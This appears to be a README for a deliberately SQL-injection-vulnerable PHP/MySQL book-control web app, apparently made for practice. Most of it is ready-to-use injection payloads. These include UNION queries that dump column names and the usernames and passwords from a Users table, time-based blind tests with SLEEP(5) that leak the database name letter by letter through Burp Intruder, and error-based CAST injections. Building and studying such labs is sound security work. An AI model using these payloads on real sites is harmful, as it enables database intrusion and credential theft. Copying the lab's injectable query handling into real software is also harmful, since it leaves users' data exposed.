# vulnerable-to-sqli
I developed a book control web application with php language. This application I developed using mysql is vulnerable to sql injection types. There are also blocked php codes against sql vulnerability.

I have attached the detection and exploitation of vulnerabilities as screen photos.

payload to get column names from Users table:
1' UNION SELECT 1,column_name,3,4,5,6 FROM information_schema.columns WHERE table_name='Users'-- -

get credentials:
1' UNION SELECT 1,UserName,3,4,Password,6 FROM Users-- -

vulnerability detection with :
/search.php?search_query=Ethical Hacking Handbook' AND sleep(5) -- -

I got 5 second delay as shown in the tool

According to 5 seconds of sleep, I got the first letter of the database with this payload: 
search.php?search_query=Ethical Hacking Handbook' AND IF(SUBSTRING(database(),1,1)='B',SLEEP(5),0) -- -
Other letters can also be obtained with the intruder tool of the burp tool.For example, to find the second letter of the database:
search.php?search_query=Ethical Hacking Handbook' AND IF(SUBSTRING(database(),2,1)='$set_Ä±ntruder',SLEEP(5),0) -- -

# ERROR-BASED SQLI
' AND 1=CAST((SELECT 1) AS int)-- -
' AND 1=CAST((SELECT username FROM users) AS int)-- -
we got an error

and gain the database name.
